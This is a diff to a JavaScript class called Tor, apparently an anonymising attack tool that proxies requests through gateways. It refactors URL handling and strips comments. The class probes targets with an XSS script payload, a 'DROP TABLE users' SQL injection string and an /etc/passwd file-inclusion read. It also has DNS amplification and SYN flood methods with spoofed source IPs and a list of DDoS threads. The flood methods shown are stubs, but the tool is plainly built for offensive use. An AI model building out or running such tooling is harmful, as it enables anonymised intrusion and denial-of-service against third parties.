@@ -76,8 +76,9 @@ class Tor {
         this.targetURL = null;
         this.attackConfig = {};
         this.ddosThreads = [];
-        this.gatewayBlacklistDuration = 60000; // 1 minute
-        this.gatewayCheckEnabled = true; // Control the gateway monitoring
+        this.gatewayBlacklistDuration = 60000;
+        this.gatewayCheckEnabled = true;
+        this.isCheckingGateways = false;
     }
 
     async initServerInfo() {
@@ -200,7 +201,7 @@ class Tor {
         try {
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 2000);
-            const testUrl = `${gateway}/httpbin.org/get`;
+            const testUrl = new URL('/httpbin.org/get', gateway).href;
             const response = await fetch(testUrl, {
                 method: 'GET',
                 signal: controller.signal,
@@ -236,7 +237,8 @@ class Tor {
     }
 
     startGatewayMonitoring() {
-        if (!this.gatewayCheckEnabled) return;
+        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
+        this.isCheckingGateways = true;
         this.gatewayMonitoringIntervalId = setInterval(async () => {
             for (const gateway of this.gateways) {
                 if (!this.failedGateways.has(gateway)) {
@@ -251,6 +253,7 @@ class Tor {
 
     stopGatewayMonitoring() {
         clearInterval(this.gatewayMonitoringIntervalId);
+        this.isCheckingGateways = false;
     }
 
 
@@ -278,7 +281,7 @@ class Tor {
         }
 
         this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-        let torURL = `${gateway}/${url}`;
+        let torURL = new URL(url, gateway).href;
 
         if (this.bypassCache) {
             torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
@@ -544,9 +547,10 @@ class Tor {
             }
 
             const reflectedXSSPayload = `<script>alert('XSS Vulnerability Detected!');</script>`;
-            const xssTestURL = `${url}?xss=${reflectedXSSPayload}`;
+            const xssTestURL = new URL(url);
+            xssTestURL.searchParams.set('xss', reflectedXSSPayload);
 
-            const xssResponse = await this.fetchWithTor(xssTestURL, { method: 'GET' });
+            const xssResponse = await this.fetchWithTor(xssTestURL.href, { method: 'GET' });
             const xssContent = await xssResponse.text();
 
             if (xssContent.includes(reflectedXSSPayload)) {
@@ -554,10 +558,11 @@ class Tor {
             }
 
             const sqliPayload = "'; DROP TABLE users; --";
-            const sqliTestURL = `${url}?id=${sqliPayload}`;
+            const sqliTestURL = new URL(url);
+            sqliTestURL.searchParams.set('id', sqliPayload);
 
             try {
-                await this.fetchWithTor(sqliTestURL, { method: 'GET' });
+                await this.fetchWithTor(sqliTestURL.href, { method: 'GET' });
             } catch (sqliError) {
                 if (sqliError.message.includes('SQL syntax')) {
                     return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
@@ -565,9 +570,10 @@ class Tor {
             }
 
             const lfiPayload = "/etc/passwd";
-            const lfiTestURL = `${url}?file=${lfiPayload}`;
+            const lfiTestURL = new URL(url);
+            lfiTestURL.searchParams.set('file', lfiPayload);
             try {
-                const lfiResponse = await this.fetchWithTor(lfiTestURL, { method: 'GET' });
+                const lfiResponse = await this.fetchWithTor(lfiTestURL.href, { method: 'GET' });
                 const lfiContent = await lfiResponse.text();
                 if (lfiContent.includes("root:")) {
                     return { vulnerable: true, type: 'Local File Inclusion', details: `LFI payload detected: able to read /etc/passwd.` };
@@ -735,43 +741,36 @@ class Tor {
     }
 
     async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
-         // Placeholder implementation - requires actual packet sending capabilities
         this.startAttack('DNS Amplification', targetIP, { spoofIP, packetsPerSecond, duration });
         this.log('DNS Amplification attack is a placeholder and requires a proper network interface.', 'warn');
-        await new Promise(resolve => setTimeout(resolve, duration * 1000));  // Simulate attack duration
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
         this.endAttack('DNS Amplification', targetIP, { totalPackets: packetsPerSecond * duration });
     }
 
     createDNSQuery() {
-        // Placeholder - Needs actual DNS query creation logic
         return {};
     }
 
     spoofPacket(dnsQuery, spoofIP, targetIP) {
-        // Placeholder - Needs actual packet spoofing logic
         return {};
     }
 
     async sendPacket(packet, targetIP) {
-        // Placeholder - Needs actual packet sending implementation
         console.log(`Sending spoofed packet to ${targetIP}`);
     }
 
     async synFloodAttack(targetIP, targetPort = 80, packetsPerSecond = 1000, duration = 60) {
-        // Placeholder implementation - requires actual packet sending capabilities
         this.startAttack('SYN Flood', targetIP, { targetPort, packetsPerSecond, duration });
         this.log('SYN Flood attack is a placeholder and requires a proper network interface.', 'warn');
-        await new Promise(resolve => setTimeout(resolve, duration * 1000)); // Simulate attack duration
+        await new Promise(resolve => setTimeout(resolve, duration * 1000));
         this.endAttack('SYN Flood', targetIP, { totalPackets: packetsPerSecond * duration });
     }
 
     createSynPacket(targetIP, targetPort) {
-        // Placeholder - Needs actual SYN packet creation logic
         return {};
     }
 
     async sendRawPacket(packet, targetIP, targetPort) {
-        // Placeholder - Needs actual raw packet sending implementation
         console.log(`Sending SYN packet to ${targetIP}:${targetPort}`);
     }
 
